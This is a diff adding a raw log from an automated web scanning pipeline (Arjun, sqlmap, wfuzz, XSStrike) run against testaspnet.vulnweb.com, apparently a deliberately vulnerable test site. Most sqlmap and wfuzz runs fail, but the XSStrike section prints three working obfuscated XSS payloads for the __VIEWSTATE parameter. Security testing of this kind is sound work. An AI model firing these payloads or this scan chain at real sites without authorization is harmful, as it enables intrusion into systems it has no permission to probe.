@@ -1,0 +1,148 @@
+[ARJUN] http://testaspnet.vulnweb.com/acuservice/service.asmx?WSDL=
+http://testaspnet.vulnweb.com/acuservice/service.asmx?WSDL=&WSDL=1828&schema=9689&op=7460&wsdl=5192
+
+[GF+qsreplace] http://testaspnet.vulnweb.com/Comments.aspx?id=1337
+http://testaspnet.vulnweb.com/Comments.aspx?id=PAYLOAD
+
+
+[SQLI - TIMEOUT] http://testaspnet.vulnweb.com/Comments.aspx?id=1337
+
+[SQLI - detect] http://testaspnet.vulnweb.com/test/vuln.cgi?par1=
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 04:31:57 /2025-10-22/
+
+[04:31:57] [WARNING] using '/app/results/testaspnet.vulnweb.com_20251022_034803/sqlmap' as the output directory
+[04:31:57] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testaspnet.vulnweb.com/test/vuln.cgi?par1=
+do you want to test this URL? [Y/n/q]
+> Y
+[04:31:57] [INFO] testing URL 'http://testaspnet.vulnweb.com/test/vuln.cgi?par1='
+[04:31:57] [INFO] using '/app/results/testaspnet.vulnweb.com_20251022_034803/sqlmap/results-10222025_0431am.csv' as the CSV results file in multiple targets mode
+[04:31:57] [INFO] testing connection to the target URL
+[04:31:58] [CRITICAL] page not found (404)
+[04:31:58] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[04:31:58] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testaspnet.vulnweb.com_20251022_034803/sqlmap/results-10222025_0431am.csv'
+
+[*] ending @ 04:31:58 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=ads/def.html
+
+[SQLI - detect] http://testaspnet.vulnweb.com/test/vuln.cgi?par2=val2
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 04:34:59 /2025-10-22/
+
+[04:34:59] [WARNING] using '/app/results/testaspnet.vulnweb.com_20251022_034803/sqlmap' as the output directory
+[04:34:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testaspnet.vulnweb.com/test/vuln.cgi?par2=val2
+do you want to test this URL? [Y/n/q]
+> Y
+[04:34:59] [INFO] testing URL 'http://testaspnet.vulnweb.com/test/vuln.cgi?par2=val2'
+[04:34:59] [INFO] using '/app/results/testaspnet.vulnweb.com_20251022_034803/sqlmap/results-10222025_0434am.csv' as the CSV results file in multiple targets mode
+[04:34:59] [INFO] testing connection to the target URL
+[04:35:00] [CRITICAL] page not found (404)
+[04:35:00] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[04:35:00] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testaspnet.vulnweb.com_20251022_034803/sqlmap/results-10222025_0434am.csv'
+
+[*] ending @ 04:35:00 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testaspnet.vulnweb.com/acuservice/service.asmx?WSDL=
+
+[WFUZZ] http://testaspnet.vulnweb.com/Comments.aspx?id=1337
+ /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
+default
+default
+
+
+[WFUZZ] http://testaspnet.vulnweb.com/test/vuln.cgi?par1=
+ /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
+default
+default
+
+
+[WFUZZ] http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=ads/def.html
+ /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
+default
+default
+
+
+[WFUZZ] http://testaspnet.vulnweb.com/test/vuln.cgi?par2=val2
+ /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
+default
+default
+
+
+[WFUZZ] http://testaspnet.vulnweb.com/acuservice/service.asmx?WSDL=
+ /usr/local/lib/python3.11/site-packages/wfuzz/wfuzz.py:77: UserWarning:Fatal exception: Error opening file. [Errno 2] No such file or directory: '/usr/share/wordlists/dirb/common.txt'
+default
+default
+
+
+[XSS] http://testaspnet.vulnweb.com/Comments.aspx?id=1337
+[91m
+	XSStrike [97mv3.1.5
+[0m
+[97m[~][0m Crawling the target [0m
+[97m[~][0m Parsing Comments.aspx?id=1337                    [0m[97m[~][0m Parsing about.aspx                               [0m[97m[~][0m Parsing rssFeed.aspx                             [0m[97m[~][0m Parsing Signup.aspx                              [0m[97m[~][0m Parsing javascript:__doPostBack(                 [0m[92m[++][91m Vulnerable webpage: [92mhttp://testaspnet.vulnweb.com/Comments.aspx?id=1337[0m [0m
+[92m[++][91m Vector for [92m__VIEWSTATE[0m: <a%0aoNPoiNTEReNtER+=+(prompt)``%0dx//v3dm0s [0m
+[92m[++][91m Vulnerable webpage: [92mhttp://testaspnet.vulnweb.com/about.aspx[0m [0m
+[92m[++][91m Vector for [92m__VIEWSTATE[0m: <dEtaIlS%0aOnPOiNTErenTEr%0d=%0d(confirm)()%0dx// [0m
+[92m[++][91m Vulnerable webpage: [92mhttp://testaspnet.vulnweb.com/Signup.aspx[0m [0m
+[92m[++][91m Vector for [92m__VIEWSTATE[0m: <d3v%0aonPoINtereNtEr%0a=%0aconfirm()%0dx//v3dm0s [0m
+[93m[!][0m Progress: 6/6 [0m
+
+
+[XSS] http://testaspnet.vulnweb.com/test/vuln.cgi?par1=
+[91m
+	XSStrike [97mv3.1.5
+[0m
+[97m[~][0m Crawling the target [0m
+[97m[~][0m Parsing test/vuln.cgi?par1=                      [0m[93m[!][0m Progress: 2/2 [0m
+
+
+[XSS] http://testaspnet.vulnweb.com/ReadNews.aspx?NewsAd=ads/def.html
+[91m
+	XSStrike [97mv3.1.5
+[0m
+[97m[~][0m Crawling the target [0m
+[97m[~][0m Parsing ReadNews.aspx?NewsAd=ads/def.html        [0m[93m[!][0m Progress: 2/2 [0m
+
+
+[XSS] http://testaspnet.vulnweb.com/test/vuln.cgi?par2=val2
+[91m
+	XSStrike [97mv3.1.5
+[0m
+[97m[~][0m Crawling the target [0m
+[97m[~][0m Parsing test/vuln.cgi?par2=val2                  [0m[93m[!][0m Progress: 2/2 [0m
+
+
+[XSS] http://testaspnet.vulnweb.com/acuservice/service.asmx?WSDL=
+[91m
+	XSStrike [97mv3.1.5
+[0m
+[97m[~][0m Crawling the target [0m
+[97m[~][0m Parsing acuservice/service.asmx?WSDL=            [0m[93m[!][0m Progress: 2/2 [0m
+
